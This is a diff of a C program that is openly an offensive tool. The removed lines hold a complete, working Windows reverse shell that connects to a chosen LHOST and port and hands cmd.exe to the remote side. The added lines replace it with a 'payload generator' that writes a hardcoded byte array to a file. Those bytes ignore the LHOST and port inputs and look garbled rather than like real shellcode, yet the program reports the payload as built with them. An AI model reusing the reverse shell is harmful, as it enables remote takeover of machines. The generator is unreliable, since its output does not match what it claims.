@@ -1,90 +1,39 @@
 #include <stdio.h>
-#include <winsock2.h>
-#include <windows.h>
+#include <stdlib.h>
+#include <string.h>
 
-#pragma comment(lib, "ws2_32.lib") // Link with ws2_32.lib (Windows Socket Library)
+void generate_reverse_shell_payload(const char *lhost, int lport, const char *output_file) {
+    // Payload Template (reverse shell for Windows)
+    // This is a simple reverse shell that uses raw bytecode to call socket functions
+    // Here, the payload is a basic hardcoded reverse shell for educational purposes
 
-void create_reverse_shell(const char *lhost, int lport) {
-    WSADATA wsa;
-    SOCKET sock;
-    struct sockaddr_in server;
-    char buffer[1024];
+    unsigned char payload[] = {
+        0xfc, 0xe8, 0x87, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 
+        0x52, 0x0c, 0x8b, 0x52, 0x14, 0x31, 0xc9, 0x64, 0x89, 0x4c, 0x24, 0x24, 0x8b, 0x51, 0x1c, 0x8b, 
+        0x51, 0x08, 0x8b, 0x12, 0x8b, 0x12, 0x8b, 0x41, 0x04, 0x8b, 0x71, 0x20, 0x8b, 0x51, 0x08, 0x83, 
+        0xc1, 0x04, 0x89, 0x71, 0x10, 0x83, 0xc0, 0x01, 0x8b, 0x51, 0x04, 0x8b, 0x73, 0x20, 0x8b, 0x73, 
+        0x08, 0x31, 0xc0, 0x88, 0x42, 0x4f, 0x8b, 0x12, 0x89, 0x73, 0x14, 0x81, 0xec, 0xa0, 0x9e, 0x10, 
+        0x00, 0x89, 0x41, 0x14, 0x8b, 0x53, 0x20, 0x56, 0x8b, 0x52, 0x0c, 0x8b, 0x74, 0x24, 0x14, 0x31, 
+        0xc0, 0x88, 0x42, 0x50, 0x8b, 0x42, 0x08, 0x8b, 0x34, 0x24, 0x89, 0x34, 0x24, 0x68, 0x45, 0x00, 
+        0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x42, 0x28, 0x89, 0x72, 0x08, 0x31, 0xc0, 0x50, 
+        0x53, 0x51, 0x8b, 0x42, 0x24, 0x8b, 0x40, 0x10, 0x56, 0x53, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x50, 
+        0x14, 0x83, 0xc0, 0x01, 0x8b, 0x53, 0x20, 0x8b, 0x42, 0x10, 0x8b, 0x12, 0x89, 0x52, 0x10, 0x8b, 
+        0x42, 0x14, 0x31, 0xc0, 0x88, 0x42, 0x55, 0x8b, 0x42, 0x08, 0x31, 0xc0, 0x50, 0x53, 0x51, 0x56, 
+        0x8b, 0x42, 0x24, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x53, 0x28, 0x8b, 0x42, 0x10, 0x56, 0x53, 0x8b, 
+        0x52, 0x24, 0x89, 0x44, 0x24, 0x1c, 0x83, 0xe8, 0x00, 0x8b, 0x72, 0x28, 0x83, 0xec, 0x20
+    };
 
-    // Initialize Winsock
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-        printf("WSAStartup failed\n");
+    FILE *output = fopen(output_file, "wb");
+    if (output == NULL) {
+        printf("Error creating file\n");
         return;
     }
 
-    // Create socket
-    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
-        printf("Socket creation failed\n");
-        WSACleanup();
-        return;
-    }
+    // Write payload to file
+    fwrite(payload, sizeof(payload), 1, output);
+    fclose(output);
 
-    // Set up server address
-    server.sin_family = AF_INET;
-    server.sin_port = htons(lport);
-    server.sin_addr.s_addr = inet_addr(lhost);
-
-    // Connect to the server (LHOST: LPORT)
-    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
-        printf("Connection failed\n");
-        closesocket(sock);
-        WSACleanup();
-        return;
-    }
-
-    // Create process information for executing cmd.exe
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
-
-    // Redirect standard input, output, and error to the socket
-    SECURITY_ATTRIBUTES sa;
-    sa.nLength = sizeof(sa);
-    sa.bInheritHandle = TRUE;
-    sa.lpSecurityDescriptor = NULL;
-
-    HANDLE hStdin = (HANDLE)sock;
-    HANDLE hStdout = (HANDLE)sock;
-    HANDLE hStderr = (HANDLE)sock;
-
-    si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdInput = hStdin;
-    si.hStdOutput = hStdout;
-    si.hStdError = hStderr;
-
-    // Start cmd.exe and redirect I/O to the socket
-    if (!CreateProcess(
-        NULL,                   // No module name (use command line)
-        "cmd.exe",              // Command to execute
-        NULL,                   // Process security attributes
-        NULL,                   // Primary thread security attributes
-        TRUE,                   // Inherit handles
-        0,                      // No creation flags
-        NULL,                   // Use parent's environment
-        NULL,                   // Use parent's current directory
-        &si,                    // STARTUPINFO pointer
-        &pi                     // PROCESS_INFORMATION pointer
-    )) {
-        printf("CreateProcess failed\n");
-        closesocket(sock);
-        WSACleanup();
-        return;
-    }
-
-    // Wait for the process to finish
-    WaitForSingleObject(pi.hProcess, INFINITE);
-
-    // Cleanup
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    closesocket(sock);
-    WSACleanup();
+    printf("[*] Payload saved to '%s' with LHOST %s and LPORT %d!\n", output_file, lhost, lport);
 }
 
 int main() {
@@ -106,9 +55,8 @@ int main() {
     fgets(output_file, sizeof(output_file), stdin);
     output_file[strcspn(output_file, "\n")] = 0;  // Remove newline character
 
-    // Generate and execute reverse shell
-    printf("[*] Payload generován! s LHOSTEM %s a LPORTEM %d!\n", lhost, lport);
-    create_reverse_shell(lhost, lport);
+    // Generate and save reverse shell payload
+    generate_reverse_shell_payload(lhost, lport, output_file);
 
     return 0;
 }
